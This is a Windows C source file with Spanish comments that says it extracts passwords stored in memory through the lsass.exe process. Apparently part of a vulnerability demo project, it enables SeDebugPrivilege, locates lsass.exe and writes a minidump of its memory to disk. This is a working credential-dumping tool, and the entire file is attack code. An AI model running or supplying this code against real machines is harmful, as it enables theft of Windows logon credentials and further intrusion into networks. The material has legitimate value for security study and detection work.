#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment (lib, "dbghelp.lib")
//Pequeño codigo para sacar una contraseña almacenada en memoria usando el proceso lsass.exe
// busca el proceso lsass.exe
int FindProcessId(const wchar_t* processName) {
    HANDLE snapshot;
    PROCESSENTRY32 processEntry;
    int processId = 0;
    BOOL result;

    // crea un snapshot de los procesos actuales
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == snapshot) {
        printf("Failed to create snapshot of processes\n");
        return 0;
    }

    // inicializa el tamaño: necesario para Process32First
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Recuperar información sobre el primer proceso encontrado en una snapshot del sistema
    result = Process32First(snapshot, &processEntry);
    if (!result) {
        printf("Failed to retrieve information about the first process\n");
        CloseHandle(snapshot);
        return 0;
    }

    // Recuperar información sobre los procesos y sale si no se logra
    while (result) {
        // si el nombre del proceso coincide, retorna el id
        if (wcscmp(processName, processEntry.szExeFile) == 0) {
            processId = processEntry.th32ProcessID;
            break;
        }
        result = Process32Next(snapshot, &processEntry);
    }

    // cierra el handle de la snapshot
    CloseHandle(snapshot);

    if (processId == 0) {
        printf("Failed to find process with name: %s\n", processName);
    }

    return processId;
}

// otorga los privilegios
BOOL SetPrivilege(LPCTSTR privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;
    BOOL result = TRUE;

    // busca el LUID para el privilegio especifico
    if (!LookupPrivilegeValue(NULL, privilege, &luid))
        result = FALSE;

    // activa el privilegio especifico
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // abre el acceso al token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
        result = FALSE;

    // ajusta los privilegios del token
    if (!AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        result = FALSE;

    // imprime el resultado sobre el establecimiento de los privilegios
    printf(result ? "Successfully enabled privilege: %s\n" : "Failed to enable privilege: %s\n", privilege);

    return result;
}

// crea un minidump del proceso lsass.exe
BOOL CreateLsassMinidump() {
    bool dumped = FALSE;
    int processId = FindProcessId(L"lsass.exe");
    HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processId);
    HANDLE dumpFileHandle = CreateFile(L"C:\\Users\\user\\source\\repos\\Vulnerability_Demo\\x64\\Debug\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // valida que el proceso lsass.exe haya sido abierto exitosamente
    if (processHandle == NULL || processHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open lsass.exe process. Error: %lu\n", GetLastError());
        return dumped;
    }

    // revisa si se creó el dumpfile
    if (dumpFileHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to create dump file. Error: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return dumped;
    }

    // escribe el minidump de lsass.exe
    dumped = MiniDumpWriteDump(processHandle, processId, dumpFileHandle, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
    if (dumped) {
        printf("Successfully created minidump of lsass.exe process\n");
    }
    else {
        printf("Failed to create minidump of lsass.exe process. Error: %lu\n", GetLastError());
    }

    // Cierra los handles
    CloseHandle(dumpFileHandle);
    CloseHandle(processHandle);

    return dumped;
}

int main(int argc, char* argv[]) {
    // activa el privilegio SE_DEBUG_NAME para acceder a la informacion del proceso
    if (!SetPrivilege(SE_DEBUG_NAME)) {
        printf("Failed to enable SE_DEBUG_NAME privilege\n");
        return -1;
    }

    // crea el minidump de lsass.exe
    if (!CreateLsassMinidump()) {
        printf("Failed to create minidump of lsass.exe process\n");
        return -1;
    }

    return 0;
}